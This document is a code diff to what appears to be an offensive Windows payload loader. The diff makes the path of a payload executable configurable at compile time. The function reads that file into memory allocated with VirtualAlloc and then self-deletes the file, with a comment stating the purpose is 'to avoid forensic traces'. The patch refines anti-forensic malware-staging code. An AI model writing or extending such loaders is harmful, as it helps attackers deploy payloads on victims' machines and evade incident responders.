@@ -2,12 +2,19 @@
 #include <stdio.h>
 #include "CWLInc.h"
 
+// Default payload path - can be overridden at compile time
+// Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""
+#ifndef PAYLOAD_PATH
+#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
+#endif
+
 BYTE *GetPayloadBuffer(OUT size_t &p_size)
 {
-	HANDLE hFile = CreateFileW(L"C:\\temp\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	wprintf(L"[*] Loading payload from: %s\n", PAYLOAD_PATH);
+	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		perror("[-] Unable to open payload file... \n");
+		wprintf(L"[-] Unable to open payload file: %s\n", PAYLOAD_PATH);
 	}
 	p_size = GetFileSize(hFile, NULL);
 	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -24,9 +31,9 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 	}
 	CloseHandle(hFile);
 	// Self-delete payload file after reading to avoid forensic traces
-	if (!DeleteFileW(L"C:\\temp\\payload64.exe"))
+	if (!DeleteFileW(PAYLOAD_PATH))
 	{
-		wprintf(L"[-] Warning: Failed to delete payload file: %d\n", GetLastError());
+		wprintf(L"[-] Warning: Failed to delete payload file %s: %d\n", PAYLOAD_PATH, GetLastError());
 	}
 	return bufferAddress;
 }
